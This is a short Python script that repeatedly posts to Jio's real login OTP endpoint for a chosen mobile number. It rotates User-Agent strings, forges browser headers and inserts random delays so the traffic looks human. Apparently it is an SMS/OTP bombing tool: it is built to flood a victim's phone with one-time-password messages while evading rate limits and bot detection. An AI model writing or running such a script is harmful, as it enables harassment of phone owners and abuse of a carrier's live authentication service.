import requests
import time
import random

# Endpoint URL
url = "https://www.jio.com/api/jio-login-service/login/sendOtp"

# Function to generate random User-Agent strings
def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        # Add more user-agent strings if needed
    ]
    return random.choice(user_agents)

# Headers template
headers = {
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json",
    "Origin": "https://www.jio.com",
    "Referer": "https://www.jio.com/selfcare/login/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Te": "trailers",
    "Connection": "keep-alive",
}

# Request payload
payload = {
    "mobileNumber": "Enter your choice number",
    "loginFlowType": "MOBILE",
    "alternateNumber": ""
}

# Function to send the request with randomized headers
def send_request():
    headers["User-Agent"] = random_user_agent()
    response = requests.post(url, headers=headers, json=payload)
    print(f"Status Code: {response.status_code}, Response: {response.text}")

# Send requests with random delays
for _ in range(5):  # Adjust the range for the number of attempts you want
    send_request()
    delay = random.uniform(1, 5)  # Random delay between 1 to 5 seconds
    print(f"Waiting for {delay:.2f} seconds before next request...")
    time.sleep(delay)
